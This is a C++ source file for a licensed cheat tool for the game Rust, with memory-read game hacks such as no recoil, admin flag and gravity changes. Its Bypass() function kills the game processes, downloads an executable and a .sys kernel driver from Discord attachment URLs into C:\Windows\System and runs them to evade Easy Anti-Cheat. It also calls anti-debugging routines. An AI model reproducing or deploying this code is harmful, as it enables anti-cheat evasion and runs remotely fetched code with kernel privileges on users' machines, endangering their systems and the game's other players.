#include <iostream>
#include "api/KeyAuth.hpp"
#include "xorstr.hpp"
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <iostream>
#include <random>
#include <Windows.h>
#include <memory>
#include <TlHelp32.h>
#include <mutex>
#include <fcntl.h> 
#include <io.h>
#include <fcntl.h> 
#include "koruma1.h"
#include "koruma2.h"
#include <cstdio>
#include "Fonts.h"
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")
//
#include "main.h"
//
#include "md5.h"

using namespace std;
#define FG_RED "\033[31m"
#define FG_PURPLE "\033[35m"
#define FG_GREEN "\033[32m"
#define FG_YELLOW "\033[33m"
#define FG_WHITE "\033[0m"
UINT64 Gbase;/* = GetModuleBaseAddress(GetProcId("RustClient.exe"), "GameAssembly.dll");*/
UINT64 Ubase;
std::string response;

#include "md5.h"
string anahtar, mixx;
string mixing, mixed;
template< typename ... Args >
std::string stringer(Args const& ... args)
{
	std::ostringstream stream;
	using List = int[];
	(void)List {
		0, ((void)(stream << args), 0) ...
	};
	return stream.str();
}

void all_features() {
	admin_flag();
	SleepEx(2, true);
	change_time();
	FovChanger();
	walkOnWater();
	spiderman();
	gravity();
	no_recoil();
	FatBullet();
}
void InitLockalPlayer()
{
	process_id = get_process_id("RustClient.exe");
	game_assembly_base_adress = get_module_base_address("GameAssembly.dll");
	unity_player_base_adress = get_module_base_address("UnityPlayer.dll");



	system("cls");
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	long long i = 0;
	UINT64  ObjMgr = Read<UINT64>(unity_player_base_adress + 0x17C1F18);
	UINT64  Obj = Read<UINT64>(ObjMgr + 0x8);

	bool LP_isValid = false;

	for (UINT64 Obj = Read<UINT64>(ObjMgr + 0x8); (Obj && (Obj != Read<UINT64>(ObjMgr))); Obj = Read<UINT64>(Obj + 0x8))
	{
		UINT64 GameObject = Read<UINT64>(Obj + 0x10);
		WORD Tag = Read<WORD>(GameObject + 0x54);

		if (Tag == 6 || Tag == 5 || Tag == 20011)
		{
			UINT64 ObjClass = Read<UINT64>(GameObject + 0x30);
			UINT64 Entity = Read<UINT64>(ObjClass + 0x18);
			if (Tag == 6)
			{
				Player2 = Read<UINT64>(Entity + 0x28);
				if (Read<UINT64>(Read<UINT64>(GameObject + 0x60)) == 0x616C506C61636F4C)
				{
					LP_isValid = true;
					Player2;
					while (true) {
						all_features();
					}
					SleepEx(2, true);
				}
			}
			else if (Tag == 5)
			{
				UINT64 ObjClass = Read<UINT64>(GameObject + 0x30);
				UINT64 Entity = Read<UINT64>(ObjClass + 0x18);
			}
			else if (Tag == 20011)
			{
				UINT64 ObjClass = Read<UINT64>(GameObject + 0x30);
				UINT64    Entity = Read<UINT64>(ObjClass + 0x18);
				UINT64 Dome = Read<UINT64>(Entity + 0x28);
				TodCycle = Read<UINT64>(Dome + 0x38);
			}
		}
	}
	SleepEx(2, true);
}
void loadcheat() {
	std::thread(&InitLockalPlayer).detach();
}


void Bypass()
{
	AntiDebugger();
	AntiTİTLE();
	AntiDriver();
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	system("TASKKILL /F /IM RustClient.exe 1>31CekenNarkoz");
	system("TASKKILL /F /IM Rust.exe 1>31CekenNarkoz");
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/795537165383630850/888733115483291658/ffafaaf.exe", "C:\\Windows\\System\\ffafaaf.exe", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/787591830756786176/933810075372511372/123.sys", "C:\\Windows\\System\\123.sys", 0, NULL);
	system("cd C:\\Windows\\System");
	system("C:\\Windows\\System\\ffafaaf.exe C:\\Windows\\System\\123.sys");
	Sleep(1500);
	MessageBox(0, "Eac Bypassed", "  ", MB_OK | MB_ICONASTERISK);
	system("cls");
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);



	system("cls");
	system("color 4");
	_setmode(_fileno(stdout), 0x20000);
	wprintf("\n"
		L"               ███╗   ██╗███████╗\n"
		L"               ████╗  ██║╚══███╔╝\n"
		L"               ██╔██╗ ██║  ███╔╝ \n"
		L"               ██║╚██╗██║ ███╔╝  \n"
		L"               ██║ ╚████║███████╗\n"
		L"               ╚═╝  ╚═══╝╚══════╝\n"




	);
	_setmode(_fileno(stdout), _O_TEXT);



	std::cout << "\n";






	std::cout << FG_RED << "            [ 1 ]" << FG_WHITE << " Load Bypass" << std::endl;
	cout << " \n";
	std::cout << FG_RED << "            [ 2 ]" << FG_WHITE << " Hack" << std::endl;
	cout << " \n";

	int secim;


	std::cout << FG_RED << "\n         -> S E L E C T : ";
	std::cin >> secim;

	switch (secim)
	{


	case 1:





		break;
	case 2:
		AntiDebugger();
		AntiTİTLE();
		AntiDriver();

		loadcheat();


		WindownsMain(0, 0, 0, 0);



		break;
	case 3:
		;
		break;
	default:
		MessageBox(0, "You Made The Wrong Choice", "Error", MB_OK | MB_ICONERROR);
		exit(0);

	}
}

void cerceve() {
	SetConsoleTitle("");
	int horizontal = 0, vertical = 0;
	int x = 370, y = 390; //// alta doğru

	HWND consoleWindow = GetConsoleWindow();
	SetWindowLong(consoleWindow, GWL_STYLE, GetWindowLong(consoleWindow, GWL_STYLE) & ~WS_MAXIMIZEBOX & ~WS_SIZEBOX);

	HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_CURSOR_INFO     cursorInfo;
	GetConsoleCursorInfo(out, &cursorInfo);
	SetConsoleCursorInfo(out, &cursorInfo);

	CONSOLE_FONT_INFOEX cfi;
	cfi.cbSize = sizeof(cfi);
	cfi.nFont = 0;
	cfi.dwFontSize.X = 0;
	cfi.dwFontSize.Y = 15;
	cfi.FontFamily = FF_DONTCARE;
	cfi.FontWeight = FW_NORMAL;
	system("Color  7");
	wcscpy_s(cfi.FaceName, L"Consolas");
	SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), FALSE, &cfi);

	HWND hwnd = GetConsoleWindow();
	MoveWindow(hwnd, 0, 0, x, y, TRUE);
	SetWindowPos(hwnd, HWND_TOPMOST, 680, 300, 800, 800, SWP_NOSIZE | SWP_NOZORDER);
	LONG lStyle = GetWindowLong(hwnd, GWL_STYLE);
	lStyle &= ~(WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
	SetWindowLong(hwnd, GWL_STYLE, lStyle);
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO csbi;

	GetConsoleScreenBufferInfo(console, &csbi);
	COORD scrollbar = {
		csbi.srWindow.Right - csbi.srWindow.Left + 1,
		csbi.srWindow.Bottom - csbi.srWindow.Top + 1
	};
	if (console == 0)
		throw 0;
	else
		SetConsoleScreenBufferSize(console, scrollbar);
	SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
	SetLayeredWindowAttributes(hwnd, 0, (255 * 100) / 100, LWA_ALPHA);






}


using namespace KeyAuth;


std::string name = XorStr("                     "); // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = XorStr("              "); // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = XorStr("               "); // app secret, the blurred text on licenses tab and other tabs
std::string version = XorStr("1.0"); // leave alone unless you've changed version on website

api KeyAuthApp(name, ownerid, secret, version);

int main()
{





	AntiDebugger();
	AntiTİTLE();
	AntiDriver();

	KeyAuthApp.init(); ///// giris

	if (KeyAuthApp.checkblack()) 
	{
		exit(0);
	}

	system(XorStr("cls").c_str());


	int option;
	std::string username;
	std::string password;
	std::string key;

	AntiDebugger();
	AntiTİTLE();
	AntiDriver();

	cerceve();

	system("cls");

	system("color 4");
	_setmode(_fileno(stdout), 0x20000);
	wprintf("\n"
		L"               ███╗   ██╗███████╗\n"
		L"               ████╗  ██║╚══███╔╝\n"
		L"               ██╔██╗ ██║  ███╔╝ \n"
		L"               ██║╚██╗██║ ███╔╝  \n"
		L"               ██║ ╚████║███████╗\n"
		L"               ╚═╝  ╚═══╝╚══════╝\n"




	);
	_setmode(_fileno(stdout), _O_TEXT);



	std::cout << "\n";

	std::cout << FG_GREEN "     [+]", Sleep(50); std::cout << FG_WHITE " C", Sleep(50); std::cout << "o", Sleep(50); std::cout << "n", Sleep(50); std::cout << "n", Sleep(50); std::cout << "e", Sleep(50); std::cout << "c", Sleep(50); std::cout << "t", Sleep(50); std::cout << "i", Sleep(50); std::cout << "n", Sleep(50); std::cout << "g", Sleep(50); std::cout << " ", Sleep(50); std::cout << "t", Sleep(50); std::cout << "o", Sleep(50); std::cout << " ", Sleep(50); std::cout << "L", Sleep(50); std::cout << "i", Sleep(50); std::cout << "c", Sleep(50); std::cout << "e", Sleep(50); std::cout << "n", Sleep(50); std::cout << "s", Sleep(50); std::cout << "e", Sleep(50); std::cout << " ", Sleep(50);  std::cout << "D", Sleep(50); std::cout << "a", Sleep(50); std::cout << "t", Sleep(50); std::cout << "a", Sleep(50); std::cout << "b", Sleep(50); std::cout << "a", Sleep(50); std::cout << "s", Sleep(50); std::cout << "e", Sleep(50);
	std::cout << " \n";
	std::cout << " \n";
	std::cout << FG_GREEN "     [+]", Sleep(50); std::cout << FG_WHITE " W", Sleep(50); std::cout << "a", Sleep(50); std::cout << "i", Sleep(50); std::cout << "t", Sleep(50); std::cout << "i", Sleep(50); std::cout << "n", Sleep(50); std::cout << "g", Sleep(50);
	std::cout << " \n";
	std::cout << " \n";



	SetConsoleTitle("%1");
	Sleep(50);
	SetConsoleTitle("%2");
	Sleep(50);
	SetConsoleTitle("%3");
	Sleep(50);
	SetConsoleTitle("%4");
	Sleep(50);
	SetConsoleTitle("%5");
	Sleep(50);
	SetConsoleTitle("%6");
	Sleep(50);
	SetConsoleTitle("%7");
	Sleep(50);
	SetConsoleTitle("%8");
	Sleep(50);
	SetConsoleTitle("%9");
	Sleep(50);
	SetConsoleTitle("%10");

	SetConsoleTitle("%11");
	Sleep(50);
	SetConsoleTitle("%12");
	Sleep(50);
	SetConsoleTitle("%13");
	Sleep(50);
	SetConsoleTitle("%14");
	Sleep(50);
	SetConsoleTitle("%15");
	Sleep(50);
	SetConsoleTitle("%16");
	Sleep(50);
	SetConsoleTitle("%17");
	Sleep(50);
	SetConsoleTitle("%18");
	Sleep(50);
	SetConsoleTitle("%19");
	Sleep(50);
	SetConsoleTitle("%20");

	SetConsoleTitle("%21");
	Sleep(50);
	SetConsoleTitle("%22");
	Sleep(50);
	SetConsoleTitle("%23");
	Sleep(50);
	SetConsoleTitle("%24");
	Sleep(50);
	SetConsoleTitle("%25");
	Sleep(50);
	SetConsoleTitle("%26");
	Sleep(50);
	SetConsoleTitle("%27");
	Sleep(50);
	SetConsoleTitle("%28");
	Sleep(50);
	SetConsoleTitle("%29");
	Sleep(50);
	SetConsoleTitle("%30");

	SetConsoleTitle("%31");
	Sleep(50);
	SetConsoleTitle("%32");
	Sleep(50);
	SetConsoleTitle("%33");
	Sleep(50);
	SetConsoleTitle("%34");
	Sleep(50);
	SetConsoleTitle("%35");
	Sleep(50);
	SetConsoleTitle("%36");
	Sleep(50);
	SetConsoleTitle("%37");
	Sleep(50);
	SetConsoleTitle("%38");
	Sleep(50);
	SetConsoleTitle("%39");
	Sleep(50);
	SetConsoleTitle("%40");

	SetConsoleTitle("%41");
	Sleep(50);
	SetConsoleTitle("%42");
	Sleep(50);
	SetConsoleTitle("%43");
	Sleep(50);
	SetConsoleTitle("%44");
	Sleep(50);
	SetConsoleTitle("%45");
	Sleep(50);
	SetConsoleTitle("%46");
	Sleep(50);
	SetConsoleTitle("%47");
	Sleep(50);
	SetConsoleTitle("%48");
	Sleep(50);
	SetConsoleTitle("%49");
	Sleep(50);
	SetConsoleTitle("%50");

	SetConsoleTitle("%51");
	Sleep(50);
	SetConsoleTitle("%52");
	Sleep(50);
	SetConsoleTitle("%53");
	Sleep(50);
	SetConsoleTitle("%54");
	Sleep(50);
	SetConsoleTitle("%55");
	Sleep(50);
	SetConsoleTitle("%56");
	Sleep(50);
	SetConsoleTitle("%57");
	Sleep(50);
	SetConsoleTitle("%58");
	Sleep(50);
	SetConsoleTitle("%59");
	Sleep(50);
	SetConsoleTitle("%60");

	SetConsoleTitle("%61");
	Sleep(50);
	SetConsoleTitle("%62");
	Sleep(50);
	SetConsoleTitle("%63");
	Sleep(50);
	SetConsoleTitle("%64");
	Sleep(50);
	SetConsoleTitle("%65");
	Sleep(50);
	SetConsoleTitle("%66");
	Sleep(50);
	SetConsoleTitle("%67");
	Sleep(50);
	SetConsoleTitle("%68");
	Sleep(50);
	SetConsoleTitle("%69");
	Sleep(50);
	SetConsoleTitle("%70");

	SetConsoleTitle("%71");
	Sleep(50);
	SetConsoleTitle("%72");
	Sleep(50);
	SetConsoleTitle("%73");
	Sleep(50);
	SetConsoleTitle("%74");
	Sleep(50);
	SetConsoleTitle("%75");
	Sleep(50);
	SetConsoleTitle("%76");
	Sleep(50);
	SetConsoleTitle("%77");
	Sleep(50);
	SetConsoleTitle("%78");
	Sleep(50);
	SetConsoleTitle("%79");
	Sleep(50);
	SetConsoleTitle("%80");

	SetConsoleTitle("%81");
	Sleep(50);
	SetConsoleTitle("%82");
	Sleep(50);
	SetConsoleTitle("%83");
	Sleep(50);
	SetConsoleTitle("%84");
	Sleep(50);
	SetConsoleTitle("%85");
	Sleep(50);
	SetConsoleTitle("%86");
	Sleep(50);
	SetConsoleTitle("%87");
	Sleep(50);
	SetConsoleTitle("%88");
	Sleep(50);
	SetConsoleTitle("%89");
	Sleep(50);
	SetConsoleTitle("%90");

	SetConsoleTitle("%91");
	Sleep(50);
	SetConsoleTitle("%92");
	Sleep(50);
	SetConsoleTitle("%93");
	Sleep(50);
	SetConsoleTitle("%94");
	Sleep(50);
	SetConsoleTitle("%95");
	Sleep(50);
	SetConsoleTitle("%96");
	Sleep(50);
	SetConsoleTitle("%97");
	Sleep(50);
	SetConsoleTitle("%98");
	Sleep(50);
	SetConsoleTitle("%99");
	Sleep(120);
	SetConsoleTitle("%100");



	std::cout << FG_GREEN "     [+]", Sleep(50); std::cout << FG_WHITE " C", Sleep(50); std::cout << "o", Sleep(50); std::cout << "n", Sleep(50); std::cout << "n", Sleep(50); std::cout << "e", Sleep(50); std::cout << "c", Sleep(50); std::cout << "t", Sleep(50); std::cout << "i", Sleep(50); std::cout << "o", Sleep(50); std::cout << "n", Sleep(50);  std::cout << " ", Sleep(50); std::cout << "S", Sleep(50); std::cout << "u", Sleep(50); std::cout << "c", Sleep(50); std::cout << "c", Sleep(50); std::cout << "e", Sleep(50); std::cout << "s", Sleep(50); std::cout << "s", Sleep(50); std::cout << "f", Sleep(50); std::cout << "u", Sleep(50); std::cout << "l", Sleep(50);
	SetConsoleTitle("");
	std::cout << " \n";
	std::cout << " \n";
	std::cout << FG_WHITE "     ->", Sleep(50); std::cout << FG_RED " L", Sleep(50); std::cout << "i", Sleep(50); std::cout << "c", Sleep(50); std::cout << "e", Sleep(50); std::cout << "n", Sleep(50); std::cout << "s", Sleep(50); std::cout << "e", Sleep(50); std::cout << " ", Sleep(50); std::cout << "K", Sleep(50); std::cout << "e", Sleep(50); std::cout << "y : ", Sleep(50);
	std::cin >> key;
	KeyAuthApp.license(key);

	system("cls");
	system("color 4");
	_setmode(_fileno(stdout), 0x20000);
	wprintf("\n"
		L"               ███╗   ██╗███████╗\n"
		L"               ████╗  ██║╚══███╔╝\n"
		L"               ██╔██╗ ██║  ███╔╝ \n"
		L"               ██║╚██╗██║ ███╔╝  \n"
		L"               ██║ ╚████║███████╗\n"
		L"               ╚═╝  ╚═══╝╚══════╝\n"




	);
	_setmode(_fileno(stdout), _O_TEXT);



	std::cout << "\n";






	std::cout << FG_RED << "            [ 1 ]" << FG_WHITE << " Load Bypass" << std::endl;
	cout << " \n";
	std::cout << FG_RED << "            [ 2 ]" << FG_WHITE << " Hack" << std::endl;
	cout << " \n";

	int secim;


	std::cout << FG_RED << "\n         -> S E L E C T : ";
	std::cin >> secim;

	switch (secim)
	{


	case 1:
		AntiDebugger();
		AntiTİTLE();
		AntiDriver();
		Bypass();




		break;
	case 2:
		AntiDebugger();
		AntiTİTLE();
		AntiDriver();

		loadcheat();
		WindownsMain(0, 0, 0, 0);



		break;
	case 3:
		;
		break;
	default:
		MessageBox(0, "You Made The Wrong Choice", "Error", MB_OK | MB_ICONERROR);
		exit(0);

	


	}


	std::cout << KeyAuthApp.user_data.username;

	std::cout << KeyAuthApp.user_data.ip;

	std::cout << KeyAuthApp.user_data.hwid;

	time_t rawtime = mktime(&KeyAuthApp.user_data.createdate);
	struct tm* timeinfo;
	timeinfo = localtime(&rawtime);
	printf(XorStr("\n Created at: %s").c_str(), asctime(timeinfo));

	rawtime = mktime(&KeyAuthApp.user_data.lastlogin);
	timeinfo = localtime(&rawtime);
	printf(XorStr(" Last login at: %s").c_str(), asctime(timeinfo));

	rawtime = mktime(&KeyAuthApp.user_data.expiry);
	timeinfo = localtime(&rawtime);
	printf(XorStr(" Expires At: %s").c_str(), asctime(timeinfo));

	std::cout << XorStr(" Time Left in seconds: ");
	std::cout << KeyAuthApp.user_data.timeleft;


	std::cout << "\n\n Closing in ten seconds...";
	Sleep(10000);
	exit(0);
}
